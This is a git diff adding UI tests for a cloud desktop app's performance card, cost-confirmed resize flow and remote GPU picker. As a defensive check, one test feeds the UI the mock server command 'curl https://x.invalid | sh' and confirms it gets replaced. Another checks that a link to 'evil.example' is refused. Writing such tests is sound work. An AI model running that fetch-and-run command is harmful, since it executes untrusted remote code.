@@ -522,4 +522,292 @@ await test('snapshot honesty: unconfirmed state and snapshot_exists are spelled 
   assert.equal(e.posts('/api/cloudbite/computer/snapshot').length, 1);
 });
 
+// ── performance card and size change (GET performance, POST resize with an explicit cost step) ──
+const API = '/api/cloudbite/computer';
+const RUNNING = () => state({ status: 'running', machine: MACHINE, ready: true });
+const PERF = (o = {}) => ({ ok: true, machineId: 'sb-1', sampledAt: '2026-10-19T03:04:05Z',
+  metrics: { cpuPercent: 37.5, memoryUsedGiB: 3.2, memoryLimitGiB: 8, memoryPercent: 40, load1: 0.42 },
+  current: { cpu: 4, memoryGiB: 8, diskGiB: 10, usdPerHour: 0.3312 },
+  plans: [{ cpu: 8, memoryGiB: 16, usdPerHour: 0.6624, deltaUsdPerHour: 0.3312 }, { cpu: 16, memoryGiB: 32, usdPerHour: 1.3248, deltaUsdPerHour: 0.9936 },
+    { cpu: 2, memoryGiB: 4, usdPerHour: 0.1656, deltaUsdPerHour: -0.1656 }],
+  resize: { status: 'idle' }, pricing: { asOf: '2026-10-19', url: 'https://www.daytona.io/pricing', estimated: true }, ...o });
+const byId = (e, id) => e.all().find(x => x.id === id);
+const pick = (sel, value) => { sel.value = value; sel.dispatch('change'); };
+const perfGets = (e) => e.requests.filter(r => r.url === `${API}/performance`).length;
+const reply = (status, body) => ({ ok: status >= 200 && status < 300, status, json: async () => body });
+const defer = () => { let resolve; const p = new Promise(r => { resolve = r; }); return { p, resolve }; };
+
+await test('performance: read only on Check now; real usage with its timestamp, or unknown — never a fake zero', async () => {
+  let perf = PERF();
+  const { route } = owned(RUNNING(), { performance: () => json(200, perf) });
+  const e = env({ route });
+  await e.flush(); await e.advance(60000);
+  assert.equal(perfGets(e), 0, 'not fetched on sign-in or by polling');
+  assert.match(e.text(), /Not checked yet/);
+  e.btn('Check now').click(); await e.flush();
+  assert.equal(perfGets(e), 1);
+  assert.match(e.text(), /Current size \| 4 vCPU · 8 GiB RAM · about \$0\.3312 per hour/);
+  assert.match(e.text(), /CPU use \| 37\.5%/);
+  assert.match(e.text(), /Memory use \| 3\.2 of 8 GiB \(40%\)/);
+  assert.match(e.text(), /Load \(1 min\) \| 0\.42/);
+  assert.match(e.text(), /Measured /);
+  assert.match(e.text(), /as of 2026-10-19\. Not a quote or guarantee/);
+  assert.equal(e.links().find(a => a.textContent === 'Daytona pricing').getAttribute('href'), 'https://www.daytona.io/pricing');
+  perf = PERF({ sampledAt: null, metrics: null, pricing: { asOf: '2026-10-19', url: 'https://evil.example/pricing', estimated: true } });
+  e.btn('Check now').click(); await e.flush();
+  assert.match(e.text(), /did not report live usage/);
+  assert.match(e.text(), /CPU use \| unknown \| Memory use \| unknown/);
+  assert.ok(!/\b0%/.test(e.text()), 'unknown is never drawn as 0%');
+  assert.equal(e.links().find(a => a.textContent === 'Daytona pricing'), undefined, 'pricing link only to daytona.io');
+  perf = PERF({ metrics: { cpuPercent: null, memoryUsedGiB: 1, memoryLimitGiB: 8, memoryPercent: 12.5, load1: 0 } });
+  e.btn('Check now').click(); await e.flush();
+  assert.match(e.text(), /CPU use \| unknown \| Memory use \| 1 of 8 GiB \(12\.5%\)/);
+  assert.equal(e.posts(`${API}/resize`).length, 0);
+});
+
+await test('size change: plan selector offers only increases; Review shows target and hourly delta; only Apply POSTs resize', async () => {
+  let perf = PERF();
+  const { s, route } = owned(RUNNING(), {
+    performance: () => json(200, perf),
+    resize: () => { perf = PERF({ resize: { status: 'pending', cpu: 8, memoryGiB: 16 } }); return json(200, RUNNING()); },
+  });
+  const e = env({ route });
+  await e.flush();
+  e.btn('Check now').click(); await e.flush();
+  const plan = byId(e, 'cc-plan');
+  assert.deepEqual(plan.children.map(o => o.value), ['', '8/16', '16/32'], 'smaller size filtered out');
+  assert.match(plan.children[1].textContent, /8 vCPU · 16 GiB RAM — \$0\.3312 per hour more/);
+  assert.equal(e.btn('Review cost').disabled, true, 'nothing chosen yet');
+  pick(plan, '8/16');
+  e.btn('Review cost').click(); await e.flush();
+  assert.match(e.text(), /Confirm the size change/);
+  assert.match(e.text(), /Now \| 4 vCPU · 8 GiB RAM · about \$0\.3312 per hour/);
+  assert.match(e.text(), /After \| 8 vCPU · 16 GiB RAM · about \$0\.6624 per hour/);
+  assert.match(e.text(), /Extra cost \| \$0\.3312 more per hour while the machine runs/);
+  assert.match(e.text(), /Disk stays 10 GiB/);
+  assert.equal(e.posts(`${API}/resize`).length, 0, 'review alone sends nothing');
+  e.btn('Cancel').click(); await e.flush();
+  assert.equal(e.btn('Apply upgrade'), undefined);
+  e.btn('Review cost').click();
+  pick(plan, '16/32');
+  assert.equal(e.btn('Apply upgrade'), undefined, 'changing the size closes the review');
+  pick(plan, '8/16'); e.btn('Review cost').click();
+  const before = perfGets(e);
+  e.btn('Apply upgrade').click(); await e.flush();
+  const [p] = e.posts(`${API}/resize`);
+  assert.deepEqual(Object.keys(p.body), ['requestId', 'cpu', 'memoryGiB', 'acknowledgeCost']);
+  assert.match(p.body.requestId, UUID);
+  assert.deepEqual({ ...p.body, requestId: 0 }, { requestId: 0, cpu: 8, memoryGiB: 16, acknowledgeCost: true });
+  assert.equal(perfGets(e), before + 1, 'answer reconciled with a GET performance');
+  assert.match(e.text(), /counts only once the machine reports the new size/);
+  assert.match(e.text(), /size change to 8 vCPU · 16 GiB RAM is in progress/);
+  assert.ok(!/The machine reports 8 vCPU/.test(e.text()), 'not claimed until the machine reports it');
+  assert.equal(e.btn('Review cost').disabled, true, 'no second change while one is pending');
+  assert.equal(plan.disabled, true);
+  perf = PERF({ current: { cpu: 8, memoryGiB: 16, diskGiB: 10, usdPerHour: 0.6624 }, plans: [{ cpu: 16, memoryGiB: 32, usdPerHour: 1.3248, deltaUsdPerHour: 0.6624 }] });
+  e.btn('Check now').click(); await e.flush();
+  assert.match(e.text(), /The machine reports 8 vCPU · 16 GiB RAM\./);
+  assert.equal(e.posts(`${API}/resize`).length, 1);
+  assert.deepEqual(e.requests.filter(r => r.method === 'POST').map(r => r.url), [`${API}/resize`], 'nothing else was started');
+  assert.equal(s.cur.status, 'running');
+});
+
+await test('size change: offered only while running; changed prices close the review instead of applying', async () => {
+  let perf = PERF();
+  const { s, route } = owned(state({ status: 'stopped', machine: MACHINE }), { performance: () => json(200, perf), resize: () => json(200, RUNNING()) });
+  const e = env({ route });
+  await e.flush();
+  e.btn('Check now').click(); await e.flush();
+  assert.equal(byId(e, 'cc-plan').disabled, true);
+  assert.match(e.text(), /available while the machine is running/);
+  s.cur = RUNNING();
+  e.btn('Refresh').click(); await e.flush();
+  pick(byId(e, 'cc-plan'), '8/16'); e.btn('Review cost').click();
+  perf = PERF({ plans: [{ cpu: 8, memoryGiB: 16, usdPerHour: 0.7, deltaUsdPerHour: 0.3688 }] });
+  e.btn('Check now').click(); await e.flush();
+  assert.equal(e.btn('Apply upgrade'), undefined);
+  assert.match(e.text(), /prices changed\. Review again/);
+  assert.equal(e.posts(`${API}/resize`).length, 0);
+});
+
+await test('size change uncertain: Retry repeats the same requestId; Forget needs a fresh Check now before another change', async () => {
+  let perfOk = true, n = 0;
+  const { route } = owned(RUNNING(), {
+    performance: () => (perfOk ? json(200, PERF()) : json(503, { error: { code: 'upstream_unavailable', message: 'x' } })),
+    resize: () => { n++; return n === 1 ? Promise.reject(new Error('lost')) : json(503, { error: { code: 'upstream_unavailable', message: 'x' } }); },
+  });
+  const e = env({ route });
+  await e.flush();
+  e.btn('Check now').click(); await e.flush();
+  pick(byId(e, 'cc-plan'), '8/16'); e.btn('Review cost').click(); e.btn('Apply upgrade').click(); await e.flush();
+  assert.match(e.text(), /No definite answer/);
+  assert.equal(e.btn('Review cost').disabled, true);
+  e.btn('Retry same request').click(); await e.flush();
+  const ids = e.posts(`${API}/resize`).map(r => r.body.requestId);
+  assert.equal(ids.length, 2); assert.equal(new Set(ids).size, 1, 'same requestId');
+  assert.deepEqual(e.posts(`${API}/resize`)[1].body, e.posts(`${API}/resize`)[0].body, 'same arguments');
+  perfOk = false;
+  const before = perfGets(e);
+  e.btn('Forget it').click(); await e.flush();
+  assert.equal(perfGets(e), before + 1, 'forgetting re-reads performance (GET), never re-POSTs');
+  assert.match(e.text(), /see whether the last size change was applied/);
+  assert.equal(e.btn('Review cost').disabled, true, 'blocked until a fresh read succeeds');
+  perfOk = true;
+  e.btn('Check now').click(); await e.flush();
+  pick(byId(e, 'cc-plan'), '8/16');
+  assert.equal(e.btn('Review cost').disabled, false);
+  assert.equal(e.posts(`${API}/resize`).length, 2);
+});
+
+// ── remote GPU card (GET compute/sandboxes, GET gpu/candidates, POST gpu/select) ──
+const SANDBOXES = { ok: true, partial: true, sandboxes: [
+  { id: 'sb-1', account: 'primary', name: 'cloudbite-computer-owner', region: 'us', state: 'started', cpu: 4, memoryGiB: 8 },
+  { id: 'sb-eu', account: 'secondary', name: 'lab-eu', region: 'eu', state: 'stopped', cpu: 2, memoryGiB: 4 },
+  { id: 'bad id!', account: 'primary', name: 'x', region: 'us', state: 'started', cpu: 1, memoryGiB: 1 }] };
+const CANDS = (sb, o = {}) => ({ ok: true, sandbox: { id: sb.id, account: sb.account, name: sb.name, region: sb.region }, observedAt: '2026-10-19T03:00:00Z',
+  locationBasis: 'region-country-estimate', note: 'Hosts per country come from Nosana.', candidates: [
+    { id: 'rtx4090-US', gpu: 'NVIDIA RTX 4090', vramGb: 24, available: 3, country: 'US', market: '4090-us', usdPerHourMin: 0.35, usdPerHourMax: 0.42, distanceKm: 812.4, selectable: true },
+    { id: 'a100-DE', gpu: 'A100 80GB', vramGb: 80, available: 0, country: 'DE', market: null, usdPerHourMin: null, usdPerHourMax: null, distanceKm: null, selectable: true },
+    { id: 'h100-x', gpu: 'H100', vramGb: 80, available: 2, country: null, market: null, usdPerHourMin: 2.1, usdPerHourMax: 2.1, distanceKm: null, selectable: false }], ...o });
+const SB1 = SANDBOXES.sandboxes[0], SBEU = SANDBOXES.sandboxes[1];
+
+function gpuRoute(handlers) {
+  const { s, route: base } = owned(RUNNING(), { 'compute/sandboxes': () => json(200, SANDBOXES), 'auth/logout': () => json(200, { authenticated: false }), ...handlers });
+  const route = (r, all) => (r.url.startsWith(`${API}/gpu/candidates?`) && handlers.candidates ? handlers.candidates(r, s) : base(r, all));
+  return { s, route };
+}
+const candItem = (e, id) => e.visible().find(x => x.getAttribute('data-candidate') === id);
+const candBtn = (e, id) => [...candItem(e, id).walk()].find(x => x.tagName === 'BUTTON');
+
+await test('GPU: nothing fetched until asked; sandbox dropdown, exact candidate query, estimates and unavailable hosts disabled', async () => {
+  const { route } = gpuRoute({ candidates: () => json(200, CANDS(SB1)) });
+  const e = env({ route });
+  await e.flush(); await e.advance(60000);
+  assert.equal(e.requests.filter(r => /\/(compute|gpu)\//.test(r.url)).length, 0, 'no GPU or sandbox call on sign-in or by polling');
+  assert.match(e.text(), /Remote GPU jobs/);
+  assert.match(e.text(), /not a CUDA device in this machine/);
+  assert.match(e.text(), /does not switch your desktop/);
+  assert.equal(byId(e, 'cc-gpu-sandbox').shown(), false);
+  e.btn('Load my sandboxes').click(); await e.flush();
+  const sel = byId(e, 'cc-gpu-sandbox');
+  assert.deepEqual(sel.children.map(o => o.value), ['', 'primary/sb-1', 'secondary/sb-eu'], 'unsafe ids dropped');
+  assert.match(e.text(), /may be incomplete/);
+  assert.ok(!e.visible().some(x => x.tagName === 'INPUT' && x.id !== 'cc-snap-name'), 'no free-text region or location input');
+  assert.equal(e.btn('Find GPUs').disabled, true);
+  pick(sel, 'primary/sb-1');
+  e.btn('Find GPUs').click(); await e.flush();
+  const q = e.requests.filter(r => r.url.startsWith(`${API}/gpu/candidates?`));
+  assert.deepEqual(q.map(r => r.url), [`${API}/gpu/candidates?sandboxId=sb-1&account=primary&minVramGb=24`]);
+  assert.match(candItem(e, 'rtx4090-US').textContent, /US · about 812 km away \(estimate\)/);
+  assert.match(candItem(e, 'rtx4090-US').textContent, /24 GB GPU memory/);
+  assert.match(candItem(e, 'rtx4090-US').textContent, /3 free hosts · Base price \$0\.3500–\$0\.4200\/h/);
+  assert.match(e.text(), /not measured network latency\. Network fee is separate\./);
+  assert.match(e.text(), /From cloudbite-computer-owner \(us\) · Checked /);
+  assert.match(e.text(), /Hosts per country come from Nosana\./);
+  assert.equal(candBtn(e, 'a100-DE').textContent, 'Not available now', '0 free hosts is not choosable even if flagged selectable');
+  assert.equal(candBtn(e, 'a100-DE').disabled, true);
+  assert.match(candItem(e, 'a100-DE').textContent, /DE · distance unknown.*Price not reported/);
+  assert.equal(candBtn(e, 'h100-x').disabled, true);
+  assert.match(candItem(e, 'h100-x').textContent, /Location unknown/);
+  pick(byId(e, 'cc-gpu-vram'), '48');
+  assert.equal(candItem(e, 'rtx4090-US'), undefined, 'changing the filter drops old results');
+  e.btn('Find GPUs').click(); await e.flush();
+  assert.match(e.requests.at(-1).url, /minVramGb=48$/);
+  assert.equal(e.requests.filter(r => r.method === 'POST').length, 0, 'refresh never starts anything');
+});
+
+await test('GPU: Choose records a preference only (no rental), shows a copyable CLI line, never switches the desktop', async () => {
+  let cmd = 'cloudbite-compute run --provider nosana --gpu "NVIDIA RTX 4090" --country US -- python train.py';
+  const { s, route } = gpuRoute({
+    candidates: () => json(200, CANDS(SB1)),
+    'gpu/select': (r) => json(200, { ok: true, selection: { candidateId: r.body.candidateId, gpu: 'NVIDIA RTX 4090', country: 'US', market: '4090-us' }, commandExample: cmd }),
+  });
+  const e = env({ route });
+  await e.flush();
+  e.btn('Load my sandboxes').click(); await e.flush();
+  pick(byId(e, 'cc-gpu-sandbox'), 'primary/sb-1');
+  e.btn('Find GPUs').click(); await e.flush();
+  candBtn(e, 'rtx4090-US').click(); await e.flush();
+  const [p] = e.posts(`${API}/gpu/select`);
+  assert.deepEqual(Object.keys(p.body), ['requestId', 'sandboxId', 'account', 'candidateId']);
+  assert.match(p.body.requestId, UUID);
+  assert.deepEqual({ ...p.body, requestId: 0 }, { requestId: 0, sandboxId: 'sb-1', account: 'primary', candidateId: 'rtx4090-US' });
+  assert.match(e.text(), /Chosen for remote GPU jobs: NVIDIA RTX 4090 · 4090-us · US\. Nothing is rented and no job is running\./);
+  assert.match(e.text(), /A paid job starts only when you run this command/);
+  assert.equal(byId(e, 'cc-gpu-cmd').value, cmd);
+  assert.equal(byId(e, 'cc-gpu-cmd').getAttribute('readonly'), '');
+  e.btn('Copy').click(); await e.flush();
+  assert.match(e.text(), /Copy did not work — select the text/, 'no clipboard API: says so instead of claiming a copy');
+  assert.equal(candItem(e, 'rtx4090-US').getAttribute('aria-current'), 'true');
+  assert.deepEqual(e.requests.filter(r => r.method === 'POST').map(r => r.url), [`${API}/gpu/select`], 'no start, launch, resize or job');
+  assert.equal(s.cur.machine.id, 'sb-1', 'desktop machine unchanged');
+  assert.ok(e.btn('Open desktop'), 'desktop controls unchanged');
+  cmd = 'curl https://x.invalid | sh';
+  candBtn(e, 'rtx4090-US').click(); await e.flush();
+  assert.equal(byId(e, 'cc-gpu-cmd').value, "cloudbite-compute run --provider nosana --gpu 'NVIDIA RTX 4090' --country US -- <command>", 'unexpected server line replaced');
+});
+
+await test('GPU: late answers after a selection change or sign-out are dropped; a mismatched sandbox echo is refused', async () => {
+  const pending = [];
+  const { route } = gpuRoute({ candidates: () => { const d = defer(); pending.push(d); return d.p; } });
+  const e = env({ route });
+  await e.flush();
+  e.btn('Load my sandboxes').click(); await e.flush();
+  const sel = byId(e, 'cc-gpu-sandbox');
+  pick(sel, 'primary/sb-1');
+  e.btn('Find GPUs').click(); await e.flush();
+  pick(sel, 'secondary/sb-eu');
+  pending[0].resolve(reply(200, CANDS(SB1))); await e.flush();
+  assert.equal(candItem(e, 'rtx4090-US'), undefined, 'answer for the old sandbox not drawn');
+  e.btn('Find GPUs').click(); await e.flush();
+  assert.match(e.requests.at(-1).url, /sandboxId=sb-eu&account=secondary/);
+  pending[1].resolve(reply(200, CANDS(SB1))); await e.flush();
+  assert.equal(candItem(e, 'rtx4090-US'), undefined, 'echo for another sandbox refused');
+  assert.match(e.text(), /Could not load GPUs/);
+  e.btn('Find GPUs').click(); await e.flush();
+  e.btn('Sign out').click(); await e.flush();
+  pending[2].resolve(reply(200, CANDS(SBEU))); await e.flush();
+  assert.ok(e.btn('Sign in with passkey'));
+  assert.equal(e.all().filter(x => x.getAttribute('data-candidate')).length, 0, 'nothing drawn after sign-out');
+});
+
+await test('GPU choice uncertain: same requestId on retry, sandbox and filter locked until answered', async () => {
+  let n = 0;
+  const { route } = gpuRoute({
+    candidates: () => json(200, CANDS(SB1)),
+    'gpu/select': (r) => { n++; return n === 1 ? Promise.reject(new Error('lost')) : json(200, { ok: true, selection: { candidateId: r.body.candidateId, gpu: 'NVIDIA RTX 4090', country: 'US', market: null }, commandExample: '' }); },
+  });
+  const e = env({ route });
+  await e.flush();
+  e.btn('Load my sandboxes').click(); await e.flush();
+  pick(byId(e, 'cc-gpu-sandbox'), 'primary/sb-1');
+  e.btn('Find GPUs').click(); await e.flush();
+  candBtn(e, 'rtx4090-US').click(); await e.flush();
+  assert.match(e.text(), /No definite answer/);
+  assert.equal(byId(e, 'cc-gpu-sandbox').disabled, true);
+  assert.equal(byId(e, 'cc-gpu-vram').disabled, true);
+  assert.equal(e.btn('Find GPUs').disabled, true);
+  e.btn('Retry same request').click(); await e.flush();
+  const ids = e.posts(`${API}/gpu/select`).map(r => r.body.requestId);
+  assert.equal(ids.length, 2); assert.equal(new Set(ids).size, 1);
+  assert.match(e.text(), /Chosen for remote GPU jobs: NVIDIA RTX 4090 · US\./);
+  assert.equal(byId(e, 'cc-gpu-cmd').value, "cloudbite-compute run --provider nosana --gpu 'NVIDIA RTX 4090' --country US -- <command>");
+});
+
+await test('KO: performance and remote GPU cards speak Korean with plain button labels', async () => {
+  const { route } = gpuRoute({ performance: () => json(200, PERF()) });
+  const e = env({ route, language: 'ko-KR' });
+  await e.flush();
+  assert.match(e.text(), /원격 GPU 작업/);
+  assert.match(e.text(), /CUDA 장치가 아니므로/);
+  e.btn('지금 확인').click(); await e.flush();
+  assert.match(e.text(), /CPU 사용률 \| 37\.5%/);
+  pick(byId(e, 'cc-plan'), '8/16'); e.btn('비용 확인').click();
+  assert.match(e.text(), /머신이 켜져 있는 동안 시간당 \$0\.3312 추가/);
+  assert.ok(e.btn('업그레이드 적용'));
+  assert.ok(e.btn('내 샌드박스 불러오기'));
+  e.btn('EN').click();
+  assert.ok(e.btn('Apply upgrade'), 'language switch keeps the open review');
+});
+
 console.log(`cloudbite-computer-ui: ${pass} passed`);
